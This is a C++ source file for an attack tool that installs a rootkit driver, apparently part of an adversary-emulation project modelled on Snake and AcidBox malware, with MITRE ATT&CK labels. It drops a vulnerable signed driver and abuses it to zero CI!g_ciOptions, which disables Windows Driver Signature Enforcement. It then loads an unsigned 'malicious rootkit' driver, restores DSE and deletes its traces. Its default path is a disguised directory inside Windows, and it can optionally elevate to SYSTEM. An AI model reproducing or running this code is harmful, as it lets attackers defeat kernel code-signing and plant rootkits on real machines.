#include <iostream>
#include <format>
#include <cxxopts.hpp>
#include "common/string.hpp"
#include "ci/ci.hpp"
#include "driver/gb.hpp"
#include "driver/driver.hpp"
#include "privesc/privesc.hpp"
#include "resource/resource.hpp"

#define _CrtSetDbgFlag(_CRTDBG_CHECK_ALWAYS_DF)

constexpr ULONG64 disable_dse = 0x0;
constexpr ULONG64 enable_dse = 0x6;

SC_HANDLE driver::g_sc_manager = nullptr;

int get_ci_info() {
	auto settings = ci::get_settings();
	if (!settings) {
		std::cerr << settings.error().what();
		return EXIT_FAILURE;
	}
	
	for (auto s : *settings) { // possible unwanted copy is being made
		std::cerr << std::format(
			"{: <18} {}\n",
			s.first,
			s.second
		);
	}

	auto ci_options = ci::get_ci_options();
	if (!ci_options) {
		std::cerr << ci_options.error().what();
		return EXIT_FAILURE;
	}

	std::cerr << std::format(
		"CI!g_ciOptions {: >22}\n",
		ci_options.value()
	);

	return EXIT_SUCCESS;
}

/*
 * install_driver:
 *      About:
 *          Install and exploit a vulnerable driver to disable DSE, and then install our malicious rootkit driver.
 *      Result:
 *          Disable DSE, install malicious rootkit.
 *          Returns EXIT_SUCCESS on success, otherwise some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1543.003: Create or Modify System Process: Windows Service
 *          T1562.001: Impair Defenses: Disable or Modify Tools
 *          T1211: Exploitation for Defense Evasion
 *      CTI:
 *          https://www.coresecurity.com/core-labs/advisories/virtualbox-privilege-escalation-vulnerability
 *          https://unit42.paloaltonetworks.com/acidbox-rare-malware/
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
int install_driver(
	std::wstring path,
	std::wstring sname,
	std::wstring uname
) {
    driver::g_sc_manager = ::OpenSCManagerW(
		nullptr,
		nullptr,
		SC_MANAGER_ALL_ACCESS
	);
    if (!driver::g_sc_manager) {
        std::cerr << common::get_last_error(
			"Could not get handle to SC Manager"
		).what();
		return EXIT_FAILURE;
    }

	std::cerr << "Creating installation directory\n";
	auto directory = resource::create_directory(path);
	if (!directory) {
		std::cerr << directory.error().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Querying CI!g_ciOptions\n";
	auto ci_options = ci::get_ci_options();
	if (!ci_options) {
		std::cerr << ci_options.error().what();
		return EXIT_FAILURE;
	}

	auto spath = std::format(L"{}\\{}.sys", path, sname);
	auto success = resource::drop(100, spath);
	if (!success) {
		std::cerr << success.error().what();
		return EXIT_FAILURE;
	}

	auto upath = std::format(L"{}\\{}.sys", path, uname);
	success = resource::drop(200, upath);
	if (!success) {
		std::cerr << success.error().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Installing vulnerable driver\n";
	auto g_driver = driver::driver::create(spath, sname);
	if (!g_driver) {
		std::cerr << g_driver.error().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Starting vulnerable driver\n";
	auto err = g_driver.value()->start();
	if (err) {
		std::cerr << err.value().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Disabling DSE\n";
	err = driver::memcpy(
		reinterpret_cast<ULONG_PTR>(ci_options.value()),
		reinterpret_cast<ULONG_PTR>(&disable_dse),
		1
	);
	if (err) {
		std::cerr << err.value().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Installing unsigned driver\n";
	auto u_driver = driver::driver::create(upath, uname);
	if (!u_driver) {
		std::cerr << u_driver.error().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Starting unsigned driver\n";
	err = u_driver.value()->start();
	if (err) {
		std::cerr << err.value().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Enabling DSE\n";
	err = driver::memcpy(
		reinterpret_cast<ULONG_PTR>(ci_options.value()),
		reinterpret_cast<ULONG_PTR>(&enable_dse),
		1
	);
	if (err) {
		std::cerr << err.value().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Stopping vulnerable driver\n";
	err = g_driver.value()->stop();
	if (err) {
		std::cerr << err.value().what();
		return EXIT_FAILURE;
	}

	std::cerr << "Removing vulnerable driver service\n";
	err = g_driver.value()->remove();
	if (err) {
		std::cerr << err.value().what();
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int main(int argc, char* argv[]) {
	cxxopts::Options options("installer.exe", "Install an unsigned driver\n");

	options.add_options()
		("i,info", "Show Code Integrity configuration")
		("p,path", "Installation directory", cxxopts::value<std::string>()->default_value("C:\\Windows\\$NtUninstallQ608317$"))
		("s,sname", "Signed driver/service name", cxxopts::value<std::string>()->default_value("gigabit"))
		("n,name", "Unsigned driver/service name", cxxopts::value<std::string>()->default_value("gusb"))
		("f,force", "Force the driver installation as SYSTEM", cxxopts::value<bool>()->default_value("false"))
		("h,help", "Print Usage");
	auto args = options.parse(argc, argv);

	if (args.count("help")) {
		std::cerr << options.help() << '\n';
		return EXIT_FAILURE;
	}

	if (args.count("info")) {
		auto exit = get_ci_info();
		return exit;
	}

	std::wstring path{ common::string_to_wstring(args["path"].as<std::string>()) };
	std::wstring sname{ common::string_to_wstring(args["sname"].as<std::string>()) };
	std::wstring uname{ common::string_to_wstring(args["name"].as<std::string>()) };

	auto exit = EXIT_SUCCESS;

	std::cerr << "Beginning installation\n";

	if(args["force"].as<bool>()) {
		exit = privesc::elevate();
		if (EXIT_SUCCESS != exit) {
			std::wcerr << L"Failed to run as SYSTEM\n";
			return exit;
		}
	}
    exit = install_driver(path, sname, uname);

	std::cerr << "Deleting vulnerable driver from disk\n";
	if (!::DeleteFileW(std::format(L"{}\\{}.sys", path, sname).c_str())) {
		std::cerr << common::get_last_error(std::format(
			"Could not delete {}\\{}.sys",
			common::wstring_to_string(path),
			common::wstring_to_string(sname)
		)).what();
		return EXIT_FAILURE;
	}

	if (EXIT_FAILURE == exit) {
        std::cerr << "\nInstallation failed\n";
		return exit;
	}

	std::cerr << "\nInstallation complete\n";
    ::CloseServiceHandle(driver::g_sc_manager);
	return exit;
}
